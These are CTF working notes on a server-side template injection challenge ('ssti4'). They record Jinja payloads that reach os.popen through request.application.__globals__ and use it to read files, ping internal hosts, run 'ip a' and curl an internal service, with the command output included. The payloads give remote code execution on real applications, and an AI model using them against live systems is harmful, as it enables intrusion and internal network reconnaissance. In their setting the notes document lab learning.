# ssti4

## What it is

Same as sst3.

https://stackoverflow.com/a/12341532/12864941
The eviltree.py file is weird it contains html, it can be displayed on the website with:
```py
{{request.application.__globals__.__builtins__.__import__('os').popen('cat eviltree.py').read()|safe}}
```
It shows some github code from (eviltree)[https://github.com/t3l3machus/eviltree]\
Not sure if it is part of the challenge.

There is a docker-compose (see docker-compose.yml) that talks about a service that should be down but isn't.\
Haven't found a way to access it yet.



```py
{{request.application.__globals__.__builtins__.__import__('os').popen('ping -c 1 toto8042').read()}}
PING toto8042 (172.23.0.2): 56 data bytes
64 bytes from 172.23.0.2: icmp_seq=0 ttl=64 time=0.147 ms
--- toto8042 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.147/0.147/0.147/0.000 ms
```

How to see stderr of commands (https://stackoverflow.com/a/637834/12864941):
```py
{{request.application.__globals__.__builtins__.__import__('os').popen('ls abc 2>&1 | cat').read()}}
```

nmap, nc, and telnet are not installed.

```
{{request.application.__globals__.__builtins__.__import__('os').popen('ip a').read()}}

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
1342: eth0@if1343: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:15:00:09 brd ff:ff:ff:ff:ff:ff
    inet 172.21.0.9/16 brd 172.21.255.255 scope global eth0
       valid_lft forever preferred_lft forever
1344: eth1@if1345: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:17:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.23.0.3/16 brd 172.23.255.255 scope global eth1
       valid_lft forever preferred_lft forever
```

See port_discovery.js
port 4242 and 8042 are open

(Using ssti)
```
$ curl toto8042:8042
this is not the way this time, goodluck !!
```

Don't know how to get port 4242 banner.
